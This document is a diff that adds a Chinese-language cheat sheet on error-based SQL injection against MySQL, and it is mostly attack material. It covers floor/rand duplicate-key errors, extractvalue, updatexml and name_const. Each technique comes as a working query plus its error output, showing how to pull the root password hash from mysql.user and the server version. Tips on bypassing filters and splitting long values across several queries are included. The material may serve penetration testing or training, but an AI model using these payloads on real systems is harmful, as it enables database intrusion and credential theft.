@@ -1,0 +1,43 @@
+报错注入
+1.利用floor报错（MySQL任意版本）
+mysql> select user from user where user='root' and (select 1 from (select count(*),concat((select password from mysql.user where user='root' limit 1),0x20,floor(rand(0)*2))x from information_schema.tables group by x)a);
+ERROR 1062 (23000): Duplicate entry '*8D317C972E41BFE5109F28A34B644AFF3E3F99A5 1' for key 'group_key'
+提示：不一定是 information_schema.tables 任何一张存在的表都行
+
+mysql> select user from user where user='root' and (select count(*) from (select 1 union select null union select !1)x group by concat((select password from mysql.user where user='root' limit 1),0x20,floor(rand(0)*2)));
+ERROR 1062 (23000): Duplicate entry '*8D317C972E41BFE5109F28A34B644AFF3E3F99A5 1' for key 'group_key'
+
+本质报错语句:
+mysql> select count(*),concat((select password from mysql.user limit 1),0x20,round(rand(0)))a from information_schema.tables group by a;
+ERROR 1062 (23000): Duplicate entry '*8D317C972E41BFE5109F28A34B644AFF3E3F99A5 1' for key 'group_key'
+
+提示：一次只能有64位，分多次查询，且中文一个算两位，若是查询值的长度大于64，会不成功，需要用到mid(returnValue, 1, 63)
+
+补充：若过滤了 * 可以 count(*) => count(-1)  floor(rand(0)*2) ==> round(rand(0))
+
+2.ExtractValue （未测试版本问题）
+mysql> select user from user where user='root' and extractvalue(1,concat(0x5c,(select length(password) from user limit 1)));
+ERROR 1105 (HY000): XPATH syntax error: '\41'
+
+mysql> select user from user where user='root' and extractvalue(1,concat(0x5c,(select mid(password,1,31) from user limit 1)));
+ERROR 1105 (HY000): XPATH syntax error: '\*8D317C972E41BFE5109F28A34B644A'
+
+mysql> select user from user where user='root' and extractvalue(1,concat(0x5c,(select mid(password,32,31) from user limit 1)));
+ERROR 1105 (HY000): XPATH syntax error: '\FF3E3F99A5'
+
+提示：只能显示32位，除去第一位，每次只能查31位，分多次查询
+
+3.UpdateXml （>MySQL 5.1）
+mysql> select * from mysql.user where user='root' and 1=(updatexml(1,concat(0x5e
+,(select mid(password,1,31) from mysql.user where user='root' limit 1)),1));
+ERROR 1105 (HY000): XPATH syntax error: '^*8D317C972E41BFE5109F28A34B644A'
+
+mysql> select * from mysql.user where user='root' and 1=(updatexml(1,concat(0x5e
+,(select mid(password,32,31) from mysql.user where user='root' limit 1)),1));
+ERROR 1105 (HY000): XPATH syntax error: '^FF3E3F99A5'
+
+提示：只能显示32位，除去第一位，每次只能查31位，分多次查询
+
+4.name_const （<=MySQL 5.1）
+mysql> select * from cms_votes where vid=1 and exists(select * from (select * from (select name_const(@@version,0))a join (select name_const(@@version,0)) b)c);
+ERROR 1060 (42S21): Duplicate column name '5.0.45-community-nt'
